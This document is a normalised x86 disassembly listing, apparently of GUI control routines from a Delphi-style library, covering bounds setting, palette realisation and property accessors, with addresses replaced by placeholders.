mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_3aae5b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_3aae67d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aae684
lea eax [ ebp - 0x1c ]
call sub_3a652a0
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_3a6457c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x84 ]
call sub_3aa2bd4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_3a6a850
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_3a652f4
sub_3aae6a0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3aae707
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_3ac0a48
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_3aafb88
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
mov edx [ eax + 0x64 ]
pop eax
call sub_3a656c8
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aae70e
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov al 0x1
sub_3aae728
push ebx
mov ebx eax
mov eax ebx
call sub_3ac0a70
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_3aae770
push ebx
mov ebx eax
mov eax ebx
call sub_3ac0ac0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x84 ]
call sub_3a656c8
je r-xdata
mov al 0x1
pop ebx
retn
sub_3aae7a8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0xa4 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x80 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_3aae7e8
push ebx
mov ebx eax
mov eax ebx
call sub_3ac0afc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
movzx eax [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_3aae81c
push ebx
mov ebx eax
mov eax ebx
call sub_3a83f70
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x110 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_3aae844
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_3aafbb8
sub_3aae868
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_3aae88c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x84
mov edx esi
call sub_3a652f4
sub_3aae8b0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_3aafaa8
sub_3aae8d0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x110 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x114 ] edx
sub_3aae8fc
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x160 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x15c ]
call sub_3a656c8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
movzx eax [ edi + 0x70 ]
cmp al [ esi + 0x158 ]
je r-xdata
mov al 0x1
sub_3aae964
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_3aaf47c
sub_3aae984
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_3aaf468
sub_3aae9a4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x158 ] bl
sub_3aae9c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_3aafb3c
sub_3aae9e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3a83664
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x78 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8904c
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_3aafc38
movzx eax [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3aae470
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_3ab0c34
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3abd670
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_3ab289c
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x8e ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7e ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xac ] eax
mov [ ebx + 0x158 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3aaeae0
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_3a6478c
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_3acde28
mov eax [ edi + 0x94 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_3a64734
mov edx edi
call sub_3a83978
push edi
mov eax [ edi + 0x94 ]
xor ecx ecx
mov edx 0xb039
call sub_3ab0e78
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov edx esp
mov eax edi
call sub_3aaf4a0
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_3a6457c
xor eax eax
mov [ edi + 0x94 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_3a64380
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_3a64380
mov eax [ edi + 0x68 ]
call sub_3a64380
mov eax [ edi + 0x64 ]
call sub_3a6a3c0
mov eax [ edi + 0x78 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax edi
call sub_3a836b0
test bl bl
jle r-xdata
sub_3aaebc4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_3aaebec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov edi eax
xor ebx ebx
cmp [ edi + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffd7
call sub_3a6457c
mov ebp eax
test ebp ebp
je r-xdata
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
movzx eax [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push ebp
push esi
call SelectPalette
mov ebp eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push ebp
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3aaec78
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
movzx eax [ esp ]
cmp al [ esi + 0x61 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
movzx ebx [ esi + 0x61 ]
movzx eax [ esp ]
mov [ esi + 0x61 ] al
test [ esi + 0x1c ] 0x1
jne r-xdata
movzx eax [ r-xdata ]
cmp al bl
je r-xdata
mov eax esi
call sub_3aaf08c
movzx eax [ r-xdata ]
cmp al [ esi + 0x61 ]
jne r-xdata
mov eax [ esi + 0x180 ]
cmp eax [ esi + 0x40 ]
jne r-xdata
mov eax [ esi + 0x188 ]
push eax
mov eax [ esi + 0x18c ]
push eax
mov ecx [ esi + 0x184 ]
mov edx [ esi + 0x180 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
mov eax [ esi + 0x184 ]
cmp eax [ esi + 0x44 ]
jne r-xdata
mov eax [ esi + 0x188 ]
cmp eax [ esi + 0x48 ]
jne r-xdata
mov eax [ esi + 0x18c ]
cmp eax [ esi + 0x4c ]
je r-xdata
sub_3aaec85
inc esi
popad
je r-xdata
pop edx
pop esi
pop ebx
retn
movzx ebx [ esi + 0x61 ]
movzx eax [ esp ]
mov [ esi + 0x61 ] al
test [ esi + 0x1c ] 0x1
jne r-xdata
movzx eax [ r-xdata ]
cmp al bl
je r-xdata
mov eax esi
call sub_3aaf08c
movzx eax [ r-xdata ]
cmp al [ esi + 0x61 ]
jne r-xdata
mov eax [ esi + 0x180 ]
cmp eax [ esi + 0x40 ]
jne r-xdata
mov eax [ esi + 0x188 ]
push eax
mov eax [ esi + 0x18c ]
push eax
mov ecx [ esi + 0x184 ]
mov edx [ esi + 0x180 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
mov eax [ esi + 0x184 ]
cmp eax [ esi + 0x44 ]
jne r-xdata
mov eax [ esi + 0x188 ]
cmp eax [ esi + 0x48 ]
jne r-xdata
mov eax [ esi + 0x18c ]
cmp eax [ esi + 0x4c ]
je r-xdata
sub_3aaed18
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_3a64380
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_3ab2238
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_3a6457c
mov edx ebx
mov eax edi
call sub_3a83738
mov eax ebx
mov si 0xffd9
call sub_3a6457c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_3aaedac
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
test [ ebx + 0x55 ] 0x8
setne al
xor al 0x1
cmp dl al
je r-xdata
test dl dl
jne r-xdata
and [ ebx + 0x54 ] 0xf7ff
or [ ebx + 0x54 ] 0x800
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax ebx
call sub_3ab000c
sub_3aaee18
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3a83adc
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_3ab0e78
sub_3aaeeac
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_3a83994
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x80 ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_3aafb3c
jmp r-xdata
cmp edi [ esi + 0x94 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_3aaed18
jmp r-xdata
xor eax eax
mov [ esi + 0x94 ] eax
sub_3aaef04
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
movzx eax [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
movzx eax bl
movzx edx [ eax + rw-data ]
mov eax edi
call sub_3aaec78
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
movzx eax [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
cmp [ esp ] 0x0
je r-xdata
movzx eax [ esp ]
test al al
je r-xdata
mov eax edi
mov si 0xffee
call sub_3a6457c
test bl bl
jne r-xdata
sub al 0x5
je r-xdata
mov eax [ edi + 0x188 ]
push eax
mov eax [ edi + 0x18c ]
push eax
mov ecx [ edi + 0x184 ]
mov edx [ edi + 0x180 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
mov eax ebx
test al al
je r-xdata
sub al 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_3aaefec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_3ab18bc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
movzx edx [ ebx + 0x57 ]
mov eax ebx
call sub_3ab000c
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_3aaf08c
mov eax ebx
call sub_3ab28e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_3ab0e78
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_3a6457c
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_3aaf08c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x164 ] 0x0
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
movzx ebx [ esi + 0x61 ]
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
add edi eax
push edi
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add edi eax
mov eax edi
lea ecx [ esp + 0x4 ]
pop edx
call sub_3a78df4
mov eax [ esp ]
mov [ esi + 0x16d ] eax
mov eax [ esp + 0x4 ]
mov [ esi + 0x171 ] eax
movzx eax [ r-xdata ]
cmp al bl
jne r-xdata
adc eax 0x0
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x175 ] eax
xor eax eax
mov [ esi + 0x179 ] eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edi eax
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add edi eax
mov [ esi + 0x165 ] edi
adc eax 0x0
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x165 ] eax
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x165 ] eax
jmp r-xdata
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add ebx eax
mov [ esi + 0x169 ] ebx
adc eax 0x0
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x169 ] eax
jmp r-xdata
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x169 ] eax
jmp r-xdata
lea ecx [ esi + 0x175 ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0xd0 ]
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
sub_3aaf210
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ ebx + 0x44 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x8c ] 0x1
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov [ ebx + 0x180 ] eax
sub_3aaf244
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx edx
mov eax ebx
mov edx [ ebx + 0x40 ]
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x8c ] 0x2
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x44 ]
mov [ ebx + 0x184 ] eax
sub_3aaf278
push ebx
push esi
mov ebx eax
push edx
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ ebx + 0x44 ]
mov eax ebx
mov edx [ ebx + 0x40 ]
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x8c ] 0x4
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x48 ]
mov [ ebx + 0x188 ] eax
sub_3aaf2ac
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x48 ]
push eax
push edx
mov ecx [ ebx + 0x44 ]
mov eax ebx
mov edx [ ebx + 0x40 ]
mov esi [ eax ]
call [ esi + 0x88 ]
or [ ebx + 0x8c ] 0x8
test [ ebx + 0x1c ] 0x2
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
mov [ ebx + 0x18c ] eax
sub_3aaf2e0
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp edi [ eax + 0x94 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_3aaf400
push [ fs : edx ]
mov [ fs : edx ] esp
cmp edi 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
cmp edi eax
je r-xdata
lea ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_3a6457c
test edi edi
je r-xdata
cmp [ eax + 0x1ac ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aaf407
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov [ ebp - 0x8 ] eax
cmp edi 0xffffffff
je r-xdata
cmp edi 0xffffffff
je r-xdata
mov eax [ eax + 0x1ac ]
mov edx [ ebp - 0x4 ]
call sub_3a7a630
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
call sub_3a83978
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x94 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x94 ] edi
test edi edi
je r-xdata
cmp [ edi + 0x1ac ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov si 0xffbe
call sub_3a6457c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc4
call sub_3a6457c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
call sub_3a83738
jmp r-xdata
mov eax [ edi + 0x1ac ]
mov edx [ ebp - 0x4 ]
call sub_3a7a33c
sub_3aaf410
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
movzx edx [ ebx + 0x57 ]
mov eax ebx
call sub_3ab000c
mov edx edi
mov eax ebx
call sub_3aaf4c0
mov edx edi
mov eax ebx
call sub_3ab0f20
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_3aaf47c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x15c ]
mov edx esi
call sub_3a652f4
pop esi
pop ebx
retn
mov [ ebx + 0x158 ] 0x0
sub_3aaf4c0
push ebx
push esi
push edi
mov ecx [ edx + 0x8 ]
mov esi [ edx ]
sub ecx esi
push ecx
mov ecx [ edx + 0xc ]
mov edi [ edx + 0x4 ]
sub ecx edi
push ecx
mov ecx edi
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
retn
sub_3aaf514
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_3aaf540
mov edx eax
mov ecx esp
mov eax esi
call sub_3a78df4
mov edx esp
mov eax ebx
call sub_3aafa14
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3aaf558
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_3aaf4fc
mov ecx esp
mov edx esi
call sub_3a78df4
mov edx esp
mov eax ebx
call sub_3aafa14
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3aaf580
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3aaf601
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aaf608
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
sub_3aaf610
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_3aaf63c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx [ eax + 0x74 ]
mov ebp [ ebx + 0x14 ]
test ebp ebp
